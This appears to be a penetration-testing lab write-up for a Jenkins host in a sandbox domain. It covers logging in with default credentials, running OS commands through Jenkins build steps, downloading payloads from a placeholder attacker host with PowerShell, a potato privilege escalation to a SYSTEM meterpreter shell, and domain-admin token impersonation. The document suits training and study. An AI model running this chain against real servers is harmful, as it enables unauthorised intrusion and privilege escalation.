# Cevapi (10.5.5.25)
***
## Enumeration
1. During our post-exploitation enumeration on **Poultry**, we noticed an HTTP server running on port **8080** of `10.5.5.25`. We opened it on our browser and we are presented with a Jenkins login page.
![[cevapi-jenkins.png]]
> [!important] 
> To access the app, you need to setup your browser to use SOCKS proxy using the following configuration
> `Proxy type: SOCKS4`, 
> `IP: 127.0.1.1`, 
> `Port: 1080`

2. After sometime poking the page, we discovered the following login credentials
```
Username: admin   
Password: admin
```

***
## Exploitation
1. After logging into Jenkins, we noticed that our current user is able to create and modify projects. So we went ahead on creating projects and used the `Build` option to execute OS commands.

> [!info] 
>  You may follow this article on how to create [Jenkins Freestyle Project](https://www.guru99.com/create-builds-jenkins-freestyle-project.html)

2. We added a build step `Execute batch command` which allows us to run mutiple commands at a time. First, we execute commands that will prepare our working environment.
```
mkdir c:\Users\Public\exploit
cd c:\Users\Public\exploit
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://KALI_IP/whoami.exe','whoami.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://KALI_IP/potato.exe','potato.exe')
```
> [!info] 
>  The above commands creates our working directory named `exploit` and downloaded our payloads within that directory.
>  We used the same payload (`whoami.exe`) when exploiting **Poultry**

![[cevapi-build1.png]]

> [!info] 
>  OS commands (injected into projects `Build`) are executed using the the `Build Now` button on the project dashboard.
![[cevapi-buildnow.png]]

3. We then started a meterpreter listener on port **80**

![[cevapi-start-listener.png]]

4. Since our setup were ready, we executed the exploit and received a connection on our meterpreter in the context of `NT AUTHORITY\SYSTEM` user. 
```
cd c:\Users\Public\exploit
potato.exe -t t -p whoami.exe -l 5833
```
![[cevapi-build3.png]]
![[cevapi-meterpreter-system.png]]

***

## Post-exploitation

1. Earlier, we discovered that **Cevapi** is, in fact, joined to the `sandbox.local` domain. So we checked if any domain accounts are logged in for us to impersonate their tokens.
![[cevapi-sandbox-admin.png]]
It appears that the `sandbox.local` administrator user is logged into Cevapi.

2. We used the `impersonate_token` command and specify the Administrator user.
```
impersonate_token sandbox\\Administrator
```
![[cevapi-impersonate.png]]

We've successfully impersonated `sandbox.local` Administrator.